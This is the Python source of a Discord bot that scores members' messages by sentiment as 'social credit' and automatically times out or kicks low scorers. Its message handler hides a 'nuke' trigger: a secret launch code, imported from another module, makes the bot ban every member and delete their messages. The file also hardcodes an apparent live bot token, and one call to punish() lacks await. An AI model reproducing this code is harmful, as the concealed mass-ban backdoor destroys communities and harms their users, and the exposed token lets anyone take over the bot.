import discord
import responses
import time
import nltk
nltk.download('vader_lexicon')
from discord.ext import commands
from nltk.sentiment.vader import SentimentIntensityAnalyzer
from collections import defaultdict
import json 
import os
from datetime import timedelta, datetime

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

# Abreviations
bot = commands.Bot(command_prefix="!", intents=intents)
sia = SentimentIntensityAnalyzer()

# File to store points
POINTS_FILE = "user_points.json"

# Load existing points or initialize new folder
def load_user_points():
    if os.path.exists(POINTS_FILE) and os.path.getsize(POINTS_FILE) > 0:
        try:
            with open(POINTS_FILE, "r") as f:
                data = json.load(f)
                return defaultdict(lambda: 80, {int(k): int(v) for k, v in data.items()})
        except json.JSONDecodeError:
            print("⚠️ Corrupted JSON file. Starting fresh.")
    return defaultdict(lambda: 80)

user_points = load_user_points()

def save_points():
    with open(POINTS_FILE, "w") as f:
        json.dump(user_points, f)

# Dictionary to track the last time a user sent a message
last_message_time = {}
last_message_content = {}

# Upon turning bot on
@bot.event
async def on_ready():
    global social_credit_message_id
    # Load social credit message ID if saved
    if os.path.exists("social_credit_message_id.txt"):
        with open("social_credit_message_id.txt", "r") as f:
            try:
                social_credit_message_id = int(f.read().strip())
            except ValueError:
                social_credit_message_id = None
    print(f"✅ Bot is ready! Logged in as {bot.user}")

# Punishment logic
async def punish(member: discord.Member, score: int):
    if score <= 0:
        await member.kick(reason="Reached 0 Social Credit score.")
        print(f"{member} has been kicked (Social Credit = 0).")
    elif score <= 30:
        await member.timeout(until=discord.utils.utcnow() + timedelta(days=1), reason="Toxic behavior (Social Credit ≤ 30).")
    elif score <= 40:
        await member.timeout(until=discord.utils.utcnow() + timedelta(hours=6), reason="Toxic behavior (Social Credit ≤ 40).")
    elif score <= 50:
        await member.timeout(until=discord.utils.utcnow() + timedelta(hours=1), reason="Toxic behavior (Social Credit ≤ 50).")
    elif score <= 60:
        await member.timeout(until=discord.utils.utcnow() + timedelta(minutes=30), reason="Toxic behavior (Social Credit ≤ 60).")
    elif score <= 70:
        await member.timeout(until=discord.utils.utcnow() + timedelta(minutes=10), reason="Toxic behavior (Social Credit ≤ 70).")

# Main message logic with spam detection
@bot.event
async def on_message(message):
    # Make sure bot doesn't get stuck in an infinite loop
    if message.author == bot.user:
        return
    
    # Spam protection logic: Check if the user is spamming
    current_time = time.time()
    last_time = last_message_time.get(message.author.id, 0)
    time_diff = current_time - last_time
    last_message = last_message_content.get(message.author.id, "")

    # Check if the user is sending the same or similar message within the threshold time
    if message.content == last_message:
        # If the same message is repeated within the threshold time, treat it as spam
        print(f"⚠️ {message.author} is spamming the same message.") 
        current_score = user_points.get(message.author.id, 80) - 10
        user_points[message.author.id] = max(0, current_score)
        punish(message.author, current_score)
        await message.delete()
        return

    # Update last message time and content
    last_message_time[message.author.id] = current_time
    last_message_content[message.author.id] = message.content
    
    # Get sentiment and change user scores
    compound = sia.polarity_scores(message.content)['compound']
    change = 0
    if (compound > .5):
        change = 1
    elif (compound < -.5):
        change = -5
    current_score = user_points.get(message.author.id, 80) + change

    user_points[message.author.id] = max(0, current_score)
    save_points()

    print(f"{message.author.display_name} | Message: {message.content}| Sentiment: {compound:.2f} | Score : {current_score}")

    if change < 0:
        await punish(message.author, current_score)
    
    # Squing nuke
    if message.content == responses.launch_code:
        print('Nuclear warhead initiated')
        for member in bot.get_all_members():
            try:
                await member.ban(reason="Nuclear Holocaust", delete_message_days=9999)
                print(f"Banned {member.display_name}!")
            except:
                print(f"Failed to Ban {member.display_name}")
        print("Nuking is complete!")
        
    await bot.process_commands(message)
    await update_social_credit_board()

@bot.command(name = "points")
async def check_pts (ctx, member: discord.Member = None):
    member = member or ctx.author
    score = user_points.get(member.id, 80)
    await ctx.send(f"{member.display_name} has a sentiment score of {score}/100")

# Social Credit Board
social_credit_message_id = None

async def update_social_credit_board():
    global social_credit_message_id

    channel = discord.utils.get(bot.get_all_channels(), name="hypathiabot")
    if channel is None:
        print(f"⚠️ #hypathiabot channel not found.")
        return

    # Format leaderboard
    leaderboard = "**📜 Social Credit Scores 📜**\n\n"
    for member_id, score in sorted(user_points.items(), key=lambda x: -x[1]):
        member = channel.guild.get_member(member_id)
        if member:
            leaderboard += f"**{member.display_name}**: {score}/100\n"

    try:
        if social_credit_message_id:
            # Try to edit existing message
            msg = await channel.fetch_message(social_credit_message_id)
            await msg.edit(content=leaderboard)
        else:
            # No saved message, send a new one
            msg = await channel.send(leaderboard)
            social_credit_message_id = msg.id
            with open("social_credit_message_id.txt", "w") as f:
                f.write(str(social_credit_message_id))
    except discord.NotFound:
        # Message was deleted, create a new one
        msg = await channel.send(leaderboard)
        social_credit_message_id = msg.id
        with open("social_credit_message_id.txt", "w") as f:
            f.write(str(social_credit_message_id))
    except Exception as e:
        print(f"⚠️ Failed to update leaderboard: {e}")

# Remember to run your bot with your personal TOKEN
bot.run("MTExNjkwMDEwNTcxOTY2MDU2NQ.GPFu8k.IdLoPi2v4ESSgsN2GPTetFxGW_yIbxdu-LQUNU")
